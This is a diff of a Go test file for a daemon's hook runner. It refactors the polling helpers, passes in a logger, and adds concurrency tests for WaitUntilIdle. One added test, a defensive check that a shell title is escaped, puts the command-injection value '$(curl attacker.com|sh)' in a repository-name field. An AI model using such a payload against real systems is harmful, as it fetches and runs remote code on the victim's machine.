@@ -2,11 +2,13 @@ package daemon
 
 import (
 	"bytes"
+	"fmt"
 	"log"
 	"os"
 	"path/filepath"
 	"runtime"
 	"strings"
+	"sync"
 	"testing"
 	"time"
 
@@ -22,9 +24,21 @@ func quote(s string) string {
 func setupRunner(t *testing.T, cfg *config.Config) (*HookRunner, Broadcaster) {
 	t.Helper()
 	b := NewBroadcaster()
-	hr := NewHookRunner(NewStaticConfig(cfg), b)
+	hr := NewHookRunner(NewStaticConfig(cfg), b, log.Default())
 	t.Cleanup(hr.Stop)
 	return hr, b
+}
+
+func poll(t *testing.T, timeout time.Duration, condition func() bool) {
+	t.Helper()
+	deadline := time.Now().Add(timeout)
+	for time.Now().Before(deadline) {
+		if condition() {
+			return
+		}
+		time.Sleep(50 * time.Millisecond)
+	}
+	t.Fatalf("condition not met within %v", timeout)
 }
 
 // waitForFile polls for the existence of a file until the timeout expires.
@@ -36,38 +50,26 @@ func waitForFile(t *testing.T, path string, timeout time.Duration) {
 // waitForFiles polls for the existence of multiple files until the timeout expires.
 func waitForFiles(t *testing.T, timeout time.Duration, paths ...string) {
 	t.Helper()
-	deadline := time.Now().Add(timeout)
-	for time.Now().Before(deadline) {
-		allExist := true
+	poll(t, timeout, func() bool {
 		for _, path := range paths {
 			if _, err := os.Stat(path); err != nil {
-				allExist = false
-				break
+				return false
 			}
 		}
-		if allExist {
-			return
-		}
-		time.Sleep(50 * time.Millisecond)
-	}
-	t.Fatalf("files %v were not created within %v", paths, timeout)
+		return true
+	})
 }
 
 // waitForFileContent polls until the file exists and has non-empty content.
 func waitForFileContent(t *testing.T, path string, timeout time.Duration) string {
 	t.Helper()
-	deadline := time.Now().Add(timeout)
 	var content []byte
-	var err error
-	for time.Now().Before(deadline) {
+	poll(t, timeout, func() bool {
+		var err error
 		content, err = os.ReadFile(path)
-		if err == nil && len(content) > 0 {
-			return string(content)
-		}
-		time.Sleep(50 * time.Millisecond)
-	}
-	t.Fatalf("file %q did not contain data within %v (last err: %v)", path, timeout, err)
-	return ""
+		return err == nil && len(content) > 0
+	})
+	return string(content)
 }
 
 // noopCmd returns a platform-appropriate no-op shell command.
@@ -349,6 +351,24 @@ func TestBeadsCommandShortSHA(t *testing.T) {
 	}
 }
 
+func TestBeadsCommandShellEscape(t *testing.T) {
+	event := Event{
+		Type:     "review.failed",
+		JobID:    1,
+		Repo:     "/repo",
+		RepoName: "$(curl attacker.com|sh)",
+		SHA:      "abc123",
+	}
+	cmd := beadsCommand(event)
+	// Must use single quotes so the shell does not expand $()
+	if strings.Contains(cmd, `"$(curl`) {
+		t.Errorf("title must not be double-quoted; got %q", cmd)
+	}
+	if !strings.Contains(cmd, "'") {
+		t.Errorf("title should be single-quoted; got %q", cmd)
+	}
+}
+
 func TestResolveCommand(t *testing.T) {
 	event := Event{
 		Type:  "review.failed",
@@ -472,7 +492,7 @@ func TestHookRunnerNoMatchDoesNotFire(t *testing.T) {
 		},
 	}
 
-	_, broadcaster := setupRunner(t, cfg)
+	hr, broadcaster := setupRunner(t, cfg)
 
 	// Send a failed event - hook is only for completed
 	broadcaster.Broadcast(Event{
@@ -486,7 +506,10 @@ func TestHookRunnerNoMatchDoesNotFire(t *testing.T) {
 		Error:    "fail",
 	})
 
-	assertFileNotCreated(t, markerFile, 500*time.Millisecond, "hook should not have fired for non-matching event")
+	hr.WaitUntilIdle()
+	if _, err := os.Stat(markerFile); err == nil {
+		t.Fatal("hook should not have fired for non-matching event")
+	}
 }
 
 func TestHooksSliceNotAliased(t *testing.T) {
@@ -614,7 +637,7 @@ event = "review.failed"
 command = "`+touchCmd(markerFile)+`"
 `)
 
-	_, broadcaster := setupRunner(t, cfg)
+	hr, broadcaster := setupRunner(t, cfg)
 
 	// Fire event for repoB -- repoA's hooks should NOT fire
 	broadcaster.Broadcast(Event{
@@ -627,7 +650,10 @@ command = "`+touchCmd(markerFile)+`"
 		Error: "fail",
 	})
 
-	assertFileNotCreated(t, markerFile, 500*time.Millisecond, "repo hook fired for a different repo's event")
+	hr.WaitUntilIdle()
+	if _, err := os.Stat(markerFile); err == nil {
+		t.Fatal("repo hook fired for a different repo's event")
+	}
 }
 
 func TestHookRunnerStopUnsubscribes(t *testing.T) {
@@ -635,7 +661,7 @@ func TestHookRunnerStopUnsubscribes(t *testing.T) {
 	cfg := &config.Config{}
 
 	before := broadcaster.SubscriberCount()
-	hr := NewHookRunner(NewStaticConfig(cfg), broadcaster)
+	hr := NewHookRunner(NewStaticConfig(cfg), broadcaster, log.Default())
 	afterSub := broadcaster.SubscriberCount()
 	if afterSub != before+1 {
 		t.Errorf("expected subscriber count %d after NewHookRunner, got %d", before+1, afterSub)
@@ -659,27 +685,9 @@ func writeRepoConfig(t *testing.T, repoDir, content string) {
 	}
 }
 
-// assertFileNotCreated polls for the given duration and fails immediately if the file appears.
-func assertFileNotCreated(t *testing.T, path string, duration time.Duration, msg string) {
-	t.Helper()
-	deadline := time.Now().Add(duration)
-	for time.Now().Before(deadline) {
-		if _, err := os.Stat(path); err == nil {
-			t.Fatal(msg)
-		}
-		time.Sleep(50 * time.Millisecond)
-	}
-}
-
 func TestHandleEventLogsWhenHooksFired(t *testing.T) {
-	// Capture log output. The "fired N hook(s)" line is written synchronously
-	// by handleEvent before it spawns async goroutines for runHook. We capture
-	// the buffer, immediately restore the logger to avoid races with async
-	// goroutines, then check the captured output.
 	var buf bytes.Buffer
-	prevOut := log.Writer()
-	log.SetOutput(&buf)
-	t.Cleanup(func() { log.SetOutput(prevOut) })
+	logger := log.New(&buf, "", 0)
 
 	cfg := &config.Config{
 		Hooks: []config.HookConfig{
@@ -688,7 +696,7 @@ func TestHandleEventLogsWhenHooksFired(t *testing.T) {
 		},
 	}
 
-	hr := &HookRunner{cfgGetter: NewStaticConfig(cfg)}
+	hr := &HookRunner{cfgGetter: NewStaticConfig(cfg), logger: logger}
 	hr.handleEvent(Event{
 		Type:    "review.completed",
 		JobID:   42,
@@ -697,8 +705,7 @@ func TestHandleEventLogsWhenHooksFired(t *testing.T) {
 		Verdict: "P",
 	})
 
-	// Restore immediately — async goroutines may still be running
-	log.SetOutput(prevOut)
+	hr.wg.Wait() // Wait for async goroutines
 
 	logOutput := buf.String()
 	if !strings.Contains(logOutput, "fired 2 hook(s)") {
@@ -714,9 +721,7 @@ func TestHandleEventLogsWhenHooksFired(t *testing.T) {
 
 func TestHandleEventNoLogWhenNoHooksMatch(t *testing.T) {
 	var buf bytes.Buffer
-	prevOut := log.Writer()
-	log.SetOutput(&buf)
-	t.Cleanup(func() { log.SetOutput(prevOut) })
+	logger := log.New(&buf, "", 0)
 
 	cfg := &config.Config{
 		Hooks: []config.HookConfig{
@@ -724,7 +729,7 @@ func TestHandleEventNoLogWhenNoHooksMatch(t *testing.T) {
 		},
 	}
 
-	hr := &HookRunner{cfgGetter: NewStaticConfig(cfg)}
+	hr := &HookRunner{cfgGetter: NewStaticConfig(cfg), logger: logger}
 	hr.handleEvent(Event{
 		Type:  "review.failed",
 		JobID: 99,
@@ -732,10 +737,85 @@ func TestHandleEventNoLogWhenNoHooksMatch(t *testing.T) {
 		SHA:   "abc",
 	})
 
-	// No hooks matched, so no async goroutines were spawned — safe to read
-	log.SetOutput(prevOut)
-
 	if strings.Contains(buf.String(), "fired") {
 		t.Errorf("expected no log output when no hooks match, got %q", buf.String())
+	}
+}
+
+func TestWaitUntilIdle_ConcurrentEvents(t *testing.T) {
+	// A dedicated stress test proving WaitUntilIdle waits past the event-processing boundary
+	// under timing races and concurrent broadcasts.
+
+	tmpDir := t.TempDir()
+
+	cfg := &config.Config{
+		Hooks: []config.HookConfig{
+			// We use a command that touches a file to verify execution.
+			// It incorporates {job_id} to ensure we can verify each individual event fired.
+			{Event: "review.completed", Command: touchCmd(filepath.Join(tmpDir, "job-{job_id}"))},
+		},
+	}
+
+	for i := range 50 {
+		hr, broadcaster := setupRunner(t, cfg)
+
+		var wg sync.WaitGroup
+		numEvents := 10
+
+		for j := range numEvents {
+			wg.Add(1)
+			go func(jobID int64) {
+				defer wg.Done()
+				broadcaster.Broadcast(Event{
+					Type:     "review.completed",
+					TS:       time.Now(),
+					JobID:    jobID,
+					Repo:     tmpDir,
+					RepoName: "test",
+					SHA:      "abc",
+					Agent:    "test",
+				})
+			}(int64(i*100 + j))
+		}
+
+		// Wait for all broadcasts to be enqueued
+		wg.Wait()
+
+		// WaitUntilIdle must wait until all hooks for queued events have finished
+		hr.WaitUntilIdle()
+
+		// Verify all hook marker files were created
+		for j := range numEvents {
+			markerFile := filepath.Join(tmpDir, fmt.Sprintf("job-%d", i*100+j))
+			if _, err := os.Stat(markerFile); err != nil {
+				t.Fatalf("iteration %d: marker file for job %d was not created before WaitUntilIdle returned", i, i*100+j)
+			}
+		}
+	}
+}
+
+func TestWaitUntilIdle_StopDoesNotDeadlock(t *testing.T) {
+	cfg := &config.Config{
+		Hooks: []config.HookConfig{
+			{Event: "review.completed", Command: "true"},
+		},
+	}
+	b := NewBroadcaster()
+	hr := NewHookRunner(NewStaticConfig(cfg), b, log.Default())
+
+	done := make(chan struct{})
+	go func() {
+		hr.WaitUntilIdle()
+		close(done)
+	}()
+
+	// Give WaitUntilIdle time to block on idleCh send
+	time.Sleep(10 * time.Millisecond)
+	hr.Stop()
+
+	select {
+	case <-done:
+	case <-time.After(2 * time.Second):
+		t.Fatal("WaitUntilIdle deadlocked after Stop")
 	}
 }
